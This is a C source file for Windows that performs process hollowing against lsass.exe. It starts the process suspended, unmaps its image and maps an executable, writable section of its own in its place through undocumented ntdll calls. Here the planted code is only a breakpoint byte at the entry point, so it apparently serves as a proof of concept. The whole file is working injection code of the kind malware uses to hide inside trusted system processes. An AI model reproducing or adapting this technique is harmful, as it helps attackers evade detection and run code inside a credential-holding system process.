#include <stdio.h>
#include <Windows.h>

#if !defined NTSTATUS
typedef LONG NTSTATUS;
#endif

#define STATUS_SUCCESS 0

#if !defined PROCESSINFOCLASS
typedef LONG PROCESSINFOCLASS;
#endif

#if !defined PPEB
typedef struct _PEB *PPEB;
#endif

#if !defined PROCESS_BASIC_INFORMATION
typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;
#endif;

typedef LONG NTSTATUS, *PNTSTATUS;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI * PFN_ZWQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS,
	PVOID, ULONG, PULONG);

NTSTATUS(__stdcall *ZwQueryInformationProcess)(
	HANDLE  ProcessHandle,
	PROCESSINFOCLASS  ProcessInformationClass,
	PVOID  ProcessInformation,
	ULONG  ProcessInformationLength,
	PULONG  ReturnLength  OPTIONAL
	);

NTSTATUS(__stdcall *ZwCreateSection)(
	PHANDLE  SectionHandle,
	ACCESS_MASK  DesiredAccess,
	PDWORD  ObjectAttributes OPTIONAL,
	PLARGE_INTEGER  MaximumSize OPTIONAL,
	ULONG  SectionPageProtection,
	ULONG  AllocationAttributes,
	HANDLE  FileHandle OPTIONAL
	);

NTSTATUS(__stdcall *ZwMapViewOfSection) (
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	OUT PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);

NTSTATUS(__stdcall *ZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

int get_entrypoint(char *read_proc)
{
	IMAGE_DOS_HEADER *idh = NULL;
	IMAGE_NT_HEADERS *inh = NULL;

	idh = (IMAGE_DOS_HEADER*)read_proc;
	inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
	printf("Entrypoint = %x\n", inh->OptionalHeader.AddressOfEntryPoint);
	return (inh->OptionalHeader.AddressOfEntryPoint);
}

int main(void)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char path_lsass[260];
	PROCESS_BASIC_INFORMATION pbi;
	DWORD nb_read;
	DWORD ImageBase;
	HANDLE hsect;
	NTSTATUS stat;
	PVOID BaseAddress = NULL;
	PVOID BaseAddress2 = NULL;
	DWORD oep;

	memset(&si, 0, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
	ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\lsass.exe", (LPWSTR)path_lsass, 260);
	wprintf(L"[+] New Path for lsasse.exe = %s\n", path_lsass);
	if (!CreateProcess((LPWSTR)path_lsass, NULL, NULL, NULL, NULL,
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
		NULL, NULL, &si, &pi))
	{
		printf("[-] CreateProcessW failed\n");
		printf("LatError = %x\n", GetLastError());
		return (-1);
	}

	ZwQueryInformationProcess = (long(__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll"), "ZwQueryInformationProcess");
	ZwMapViewOfSection = (long(__stdcall *)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetProcAddress(GetModuleHandleA("ntdll"), "ZwMapViewOfSection");
	ZwUnmapViewOfSection = (long(__stdcall *)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "ZwUnmapViewOfSection");
	ZwCreateSection = (long(__stdcall *)(PHANDLE, ACCESS_MASK, PDWORD, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetProcAddress(GetModuleHandleA("ntdll"), "ZwCreateSection");

	if (ZwMapViewOfSection == NULL || ZwQueryInformationProcess == NULL || ZwUnmapViewOfSection == NULL || ZwCreateSection == NULL)
	{
		printf("[-] GetProcAddress failed\n");
		return (-1);
	}

	if (ZwQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
	{
		printf("[-] ZwQueryInformation failed\n");
		return (-1);
	}

	printf("[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);

	if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, 4, &nb_read) && nb_read != 4)
	{
		printf("[-] ReadProcessMemory failed\n");
		return (-1);
	}

	printf("[+] ImageBase = 0x%x\n", ImageBase);

	char read_proc[0x6000];

	if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, read_proc, 0x6000, &nb_read) && nb_read != 0x6000)
	{
		printf("[-] ReadProcessMemory failed\n");
		return (-1);
	}

	printf("(dbg) Two first bytes : %c%c\n", read_proc[0], read_proc[1]);
	oep = get_entrypoint(read_proc);

	LARGE_INTEGER a;
	a.HighPart = 0;
	a.LowPart = 0x8EF6;

	if ((stat = ZwCreateSection(&hsect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
		printf("[-] ZwCreateSection failed\n");
		printf("[-] NTSTATUS = %x\n", stat);
		return (-1);
	}
	SIZE_T size;
	size = 0x8000;

	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(hsect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
		printf("[-] ZwMapViewOfSection failed\n");
		printf("[-] NTSTATUS = %x\n", stat);
		return (-1);
	}
	memset((BYTE*)read_proc + oep, 0xCC, 1);
	memcpy(BaseAddress, read_proc, 0x2000);
	BaseAddress = (PVOID)ImageBase;
	printf("BaseAddress = %x\n", BaseAddress);

	ZwUnmapViewOfSection(pi.hProcess, BaseAddress);

	if ((stat = ZwMapViewOfSection(hsect, pi.hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
		printf("[-] ZwMapViewOfSection failed\n");
		printf("[-] NTSTATUS = %x\n", stat);
		system("pause");
		return (-1);
	}
	printf("BaseAddress = %x\n", BaseAddress);
	ResumeThread(pi.hThread);
	system("pause");

	return (0);
}